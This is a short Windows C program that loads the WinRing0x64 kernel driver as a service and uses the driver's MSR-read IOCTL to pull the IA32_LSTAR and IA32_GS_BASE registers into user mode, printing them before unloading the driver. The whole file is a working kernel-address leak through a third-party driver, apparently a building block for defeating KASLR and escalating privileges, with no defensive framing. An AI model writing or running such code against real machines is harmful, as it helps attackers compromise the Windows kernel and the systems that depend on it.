#include <windows.h>
#include <stdio.h>

#define OLS_TYPE 40000
#define IOCTL_OLS_READ_MSR CTL_CODE(OLS_TYPE, 0x821, METHOD_BUFFERED, FILE_ANY_ACCESS)

#pragma pack(push,4)
typedef struct { ULONG Register; ULONG EaxValue; ULONG EdxValue; } MSR_BUF;
#pragma pack(pop)

int load_driver(const char* path) {
    SC_HANDLE scm=OpenSCManagerA(NULL,NULL,SC_MANAGER_CREATE_SERVICE);
    SC_HANDLE ex=OpenServiceA(scm,"WinRing0x64",SERVICE_ALL_ACCESS);
    if(ex){SERVICE_STATUS ss;ControlService(ex,SERVICE_CONTROL_STOP,&ss);
        DeleteService(ex);CloseServiceHandle(ex);Sleep(500);}
    SC_HANDLE svc=CreateServiceA(scm,"WinRing0x64","WinRing0x64",
        SERVICE_ALL_ACCESS,SERVICE_KERNEL_DRIVER,SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,path,NULL,NULL,NULL,NULL,NULL);
    if(!svc){CloseServiceHandle(scm);return 0;}
    BOOL ok=StartServiceA(svc,0,NULL);
    CloseServiceHandle(svc);CloseServiceHandle(scm);
    return ok;
}

void unload_driver() {
    SC_HANDLE scm=OpenSCManagerA(NULL,NULL,SC_MANAGER_CREATE_SERVICE);
    SC_HANDLE svc=OpenServiceA(scm,"WinRing0x64",SERVICE_ALL_ACCESS);
    if(svc){SERVICE_STATUS ss;ControlService(svc,SERVICE_CONTROL_STOP,&ss);
        Sleep(500);DeleteService(svc);CloseServiceHandle(svc);}
    CloseServiceHandle(scm);
}

int main() {
    char drv[MAX_PATH],dir[MAX_PATH];
    GetModuleFileNameA(NULL,dir,MAX_PATH);
    char* p=strrchr(dir,'\\');if(p)*p='\0';
    snprintf(drv,MAX_PATH,"%s\\WinRing0x64.sys",dir);
    load_driver(drv);

    HANDLE h=CreateFileA("\\\\.\\WinRing0_1_2_0",
        GENERIC_READ|GENERIC_WRITE,0,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);

    /* Read IA32_LSTAR MSR 0xC0000082 */
    MSR_BUF buf={0xC0000082,0,0};
    DWORD bytes=0;
    BOOL ok=DeviceIoControl(h,IOCTL_OLS_READ_MSR,
        &buf,sizeof(buf),&buf,sizeof(buf),&bytes,NULL);

    printf("[MSR] Result: %s bytes=%lu err=%lu\n", ok?"OK":"FAIL", bytes, GetLastError());
    printf("[MSR] EAX=0x%08X EDX=0x%08X\n", buf.EaxValue, buf.EdxValue);
    printf("[MSR] Full: EDX:EAX = 0x%08X%08X\n", buf.EdxValue, buf.EaxValue);

    /* Read IA32_GS_BASE MSR 0xC0000101 */
    buf.Register=0xC0000101; buf.EaxValue=0; buf.EdxValue=0;
    ok=DeviceIoControl(h,IOCTL_OLS_READ_MSR,
        &buf,sizeof(buf),&buf,sizeof(buf),&bytes,NULL);
    printf("[MSR] GS_BASE EAX=0x%08X EDX=0x%08X\n", buf.EaxValue, buf.EdxValue);
    printf("[MSR] GS_BASE Full: 0x%08X%08X\n", buf.EdxValue, buf.EaxValue);

    CloseHandle(h);
    unload_driver();
    getchar();
    return 0;
}
